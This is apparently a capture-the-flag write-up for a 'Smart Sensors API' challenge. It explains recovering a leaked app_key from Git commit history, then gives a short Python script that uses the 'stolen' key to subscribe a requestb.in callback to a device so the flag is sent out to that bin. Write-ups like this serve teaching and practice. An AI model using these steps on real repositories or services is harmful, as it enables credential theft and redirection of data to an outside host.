# WriteUp - Smart Sensors API

In this challenge you get an incomplete Git repository. 
First, you try to understand what's going on.

You begin with a `git status` to list current changes to the repository. 
But you find nothing in this list.

Then you want to know more about the repository so you try a `git log`.
And you check commit messages. You can read the code and you will quickly understand 
that wrappers require access before allowing flask handlers to continue.

You also find an `app_key` when doing a `git diff` on a commit before a commit having a 
message containing the developper blaming himself: `Ooohhh... dumb...`

When its done you can use the API as if you were a legitimate user. Last thing is to find 
the flag.

In order to achieve this you'll find that multiple devices have been hacked using route 
`/report`.

Yet, you won't find anything like a flag subscribing to these devices, just funny messages.

One device is the FlagRaiserOne as you can expect it this is the one which will give you 
the flag.

Subscribe to it using the following script : 
```python
#!/usr/bin/env python3
# -!- encoding:utf8 -!-

import requests

CALLBACK = 'http://requestb.in/<your_request_bin_id_here>'
DEV_EUI = '<device_eui_here>'
API_KEY = '<stolen_api_key_here>'

resp = requests.post('http://<smart_sensors_api_domain+port>/report/subscribe', 
        data={'api_key':API_KEY, 'callback':CALLBACK, 'dev_eui':DEV_EUI})
print(resp.text)

```

If this script runs correctly you'll receive the flag in your bin.
